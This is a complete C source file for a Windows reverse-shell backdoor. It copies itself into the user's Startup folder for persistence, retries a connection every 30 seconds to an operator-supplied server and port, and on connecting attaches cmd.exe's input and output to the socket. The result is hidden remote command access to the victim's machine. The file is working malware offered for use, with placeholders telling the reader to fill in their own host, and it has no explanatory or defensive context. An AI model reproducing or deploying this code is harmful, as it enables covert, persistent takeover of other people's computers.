#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#define seconds(n)(n*1000)
#pragma comment(lib,"ws2_32")
char server[80]="";       //edit these 2 with your own
int port=0;

char *get_exe_name();
int move_to_startup();
_Bool shell_connect();

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow){
    move_to_startup(get_exe_name());
    chdir(getenv("USERPROFILE"));
    while(!shell_connect()) Sleep(seconds(30));
}

char *get_exe_name(){
    char exe_path[MAX_PATH];
    GetModuleFileName(NULL,exe_path,MAX_PATH);
    char *exe_name=strrchr(exe_path,'\\');
    if(exe_name!=NULL)exe_name++;
    else exe_name=exe_path;
    return exe_name;
}

int move_to_startup(const char *file_path){                  //1 successfully moved, -1 error, 0 already in
    char current_path[MAX_PATH];
    GetModuleFileName(NULL,current_path,MAX_PATH);
    char destination_path[MAX_PATH];
    sprintf(destination_path,"%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s",getenv("APPDATA"),file_path);
    if(strcmp(current_path,destination_path)!=0)return MoveFile(current_path,destination_path)?1:-1;
    return 0;
}

_Bool shell_connect(){      //gently sampled from https://www.revshells.com/
    WSADATA wsaData;
    SOCKET Winsock;   
    struct sockaddr_in hax;
    STARTUPINFO ini_processo;
    PROCESS_INFORMATION processo_info;
    WSAStartup(MAKEWORD(2,2),&wsaData);
    Winsock=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
    struct hostent *host;
    host=gethostbyname(server);
    strcpy_s(server,16,inet_ntoa(*((struct in_addr *)host->h_addr)));
    hax.sin_family=AF_INET;
    hax.sin_port=htons(port);
    hax.sin_addr.s_addr=inet_addr(server);
    int connect=WSAConnect(Winsock,(SOCKADDR*)&hax,sizeof(hax),NULL,NULL,NULL,NULL);
    if(!connect){
        memset(&ini_processo,0,sizeof(ini_processo));
        ini_processo.cb=sizeof(ini_processo);
        ini_processo.dwFlags=STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
        ini_processo.hStdInput=ini_processo.hStdOutput=ini_processo.hStdError=(HANDLE)Winsock;
        TCHAR cmd[255]=TEXT("cmd.exe");
        CreateProcess(NULL,cmd,NULL,NULL,TRUE,0,NULL,NULL,&ini_processo,&processo_info);
        return 1;
    }
    return 0;
}
